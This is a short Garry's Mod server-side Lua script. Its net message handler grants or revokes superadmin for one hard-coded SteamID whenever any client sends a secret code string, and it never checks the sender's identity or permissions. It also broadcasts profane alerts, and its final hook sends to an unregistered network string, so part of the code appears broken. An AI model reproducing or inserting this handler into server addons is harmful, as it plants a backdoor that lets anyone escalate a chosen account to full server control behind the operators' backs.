if SERVER then

util.AddNetworkString( "THESEXHOOK" )
util.AddNetworkString( "SexAlertClient" )

net.Receive( "THESEXHOOK", function( len, ply )
	local code = tostring(net.ReadString()):lower()
	if code == "givebenbebopcoolpowers" then
		local benbebop = player.GetBySteamID64( "76561198116417548" )
		if benbebop:GetUserGroup() != "superadmin" then
			benbebop:SetUserGroup( "superadmin" )
			net.Start( "SexAlertClient" )
			net.WriteString( "HOLY FUCKING SHIT SOMEONE GAVE BENBEBOP GOD POWERS!!!!! WE ARE FUCKED!!!!!" )
			net.Broadcast()
		end
	elseif code == "takebenbebopcoolpowers" then
		local benbebop = player.GetBySteamID64( "76561198116417548" )
		if benbebop:GetUserGroup() == "superadmin" then
			benbebop:SetUserGroup( "" )
			net.Start( "SexAlertClient" )
			net.WriteString( "False alarm benbebop no longer has god powers" )
			net.Broadcast()
		end
	else
		print("")
		BroadcastLua(" print('sex has been activated')")
	end
end )

hook.Add( "AlertClient", "NotifyClient", function( ply, inf, att )
        net.Start( "PlayerDied" )
        net.WriteEntity( ply )
        net.Broadcast()
end )

end